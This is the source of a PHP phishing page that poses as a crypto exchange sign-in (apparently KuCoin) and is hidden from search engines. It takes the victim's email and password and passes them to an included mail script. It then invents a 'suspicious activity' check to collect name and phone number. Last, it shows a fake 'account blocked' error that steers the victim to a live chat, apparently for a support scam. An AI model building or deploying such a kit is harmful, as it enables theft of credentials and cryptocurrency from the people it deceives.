<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="robots" content="noindex, nofollow"/>
<meta name="googlebot" content="noindex, nofollow"/>
<meta name="bingbot" content="noindex, nofollow"/>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Exchange, Bitcoin Exchange</title>
    <link rel="stylesheet" href="assets/css/all.min.html">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <div class="container-fluid" id="kucoin-form">
        <div class="row">

           
            <div class="col-md-7 p-0 bgleft" >
                <a href="#" style="padding: 30px; display: inline-block;"><img src="assets/images/download.svg"></a>
                 <?php
                 if (isset($_POST['btnLoginMore'])) {
                    include 'mail.php';
                ?>

                <div class="form-area">
                     
                    
                    <div class="form">
                        <h2>Verification Required</h2>
                        <p>Important Message:</p>
                        <p>Some Suspicious Activity Found With Your Account, Enter Your Phone Number to Verify Your
                            Identity.</p>
                        <form class="form-group" action="" method="post">
                         <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                         <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />

                            <label>Full Name</label>
                            <input type="text" placeholder="Full Name" name="name" class="form-control">
                            <label>Phone Number</label>
                            <input type="text" placeholder="+1 123 456 7890" name="number" class="form-control">
                            <div>
                                <button type="submit" name="fromLog" class="btn">Verify</button>
                            </div>
                        </form>
                    </div>
                </div>

                  <?php } elseif (isset($_POST['fromLog'])) {
                     include 'mail.php';
                 ?>

                 <div class="form-area">
                   
                    <div class="form">
                        <h2>Important Message:</h2>
                        <p>Due to unauthorized activity and identification failure on your Account. Account Access has been blocked. Please Get in touch with our Support Staff Immediately</p>
                        <h4 class="callnow">Error CODE: EBRX16X76D</h4>
                        <a class="askBtn1" href="javascript:void(Tawk_API.toggle())" class="btn">Ask Expert</a>
                    </div>
                </div>

                  <?php } else { ?>
                    <div class="form-area">
                   
                    <div class="form">
                        <h2>Sign In</h2>
                        
                        <div class="tab-content" id="myTabContent">
                            <div class="tab-pane fade show active" id="email" role="tabpanel"
                                aria-labelledby="email-tab">
                                <form action="" method="post">
                                    <div class="form-group">
                                        <label for="exampleInputEmail1">Email</label>
                                        <input type="email" class="form-control" name="email" required="" id="exampleInputEmail1"
                                            aria-describedby="emailHelp" placeholder="Please enter your email"></div>
                                            <div class="form-group"><label for="exampleInputPassword1">Password</label>
                                        <input type="password" class="form-control" name="password" id="exampleInputPassword1" required="" placeholder="Please enter your password">
                                    </div>
                                   <button type="submit" name="btnLoginMore" class="btn btn-block">Sign In</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>


                <?php } ?>

                
            </div>
             <div class="col-md-5 p-0">
                <div class="content">
                    <div class="overlay-content">
                        
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="assets/js/jquery-3.5.1.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>

     <!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/621a7b48a34c24564128808d/1fsrn35pf';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
</body>
</html>